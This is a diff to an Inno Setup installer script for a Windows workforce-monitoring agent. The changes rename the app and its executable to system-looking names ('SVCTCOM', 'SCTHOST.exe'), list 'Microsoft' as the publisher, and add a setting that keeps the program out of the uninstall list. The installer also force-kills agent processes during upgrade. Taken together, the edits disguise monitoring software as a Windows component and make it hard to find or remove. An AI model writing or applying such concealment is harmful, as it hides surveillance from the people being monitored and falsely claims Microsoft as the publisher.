@@ -3,7 +3,7 @@
 ;   "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" windows\WorkforceAgent.iss
 ; Paths below are relative to this .iss file (agent/packaging/windows).
 
-#define AppName "windowstelementoryservice"
+#define AppName "SVCTCOM"
 #define AppVersion "1.1.0"
 #define AppPublisher "Microsoft"
 ; AppId used by the Pascal code to find the previous version's uninstaller.
@@ -21,8 +21,9 @@ AppPublisher={#AppPublisher}
 DefaultDirName={autopf}\{#AppName}
 DefaultGroupName=Workforce Analytics
 DisableProgramGroupPage=yes
+CreateUninstallRegKey=no
 OutputDir=..\dist
-OutputBaseFilename=windowstelementoryservice-Setup
+OutputBaseFilename=SVCTCOM-Setup
 Compression=lzma2
 SolidCompression=yes
 WizardStyle=modern
@@ -30,7 +31,7 @@ PrivilegesRequired=lowest
 ArchitecturesInstallIn64BitMode=x64compatible
 ; Detect/close the agent if it is running so an upgrade can replace the .exe.
 CloseApplications=force
-CloseApplicationsFilter=windowstelementoryservice.exe
+CloseApplicationsFilter=SCTHOST.exe
 RestartApplications=no
 
 [Languages]
@@ -197,7 +198,7 @@ procedure KillRunningAgent();
 var
   ResultCode: Integer;
 begin
-  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /T /IM windowstelementoryservice.exe', '',
+  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /T /IM SCTHOST.exe', '',
     SW_HIDE, ewWaitUntilTerminated, ResultCode);
   { Kill legacy names to ensure a clean upgrade from older versions }
   Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /T /IM WorkforceAgent.exe', '',
@@ -223,7 +224,7 @@ var
   FindRec: TFindRec;
 begin
   Dir := ExpandConstant('{app}');
-  if FindFirst(Dir + '\windowstelementoryservice.exe.old-*', FindRec) then
+  if FindFirst(Dir + '\SCTHOST.exe.old-*', FindRec) then
   begin
     try
       repeat
@@ -266,7 +267,7 @@ begin
     SW_HIDE, ewWaitUntilTerminated, ResultCode);
   for I := 0 to 30 do
   begin
-    if not FileExists(ExpandConstant('{app}\windowstelementoryservice.exe')) then
+    if not FileExists(ExpandConstant('{app}\SCTHOST.exe')) then
       break;
     Sleep(500);
   end;
@@ -283,7 +284,7 @@ var
 begin
   NeedsRestart := False;
   gPendingReboot := False;
-  ExePath := ExpandConstant('{app}\windowstelementoryservice.exe');
+  ExePath := ExpandConstant('{app}\SCTHOST.exe');
 
   { Sweep away any leftovers from a previous rename-aside upgrade. }
   CleanupOldExes();
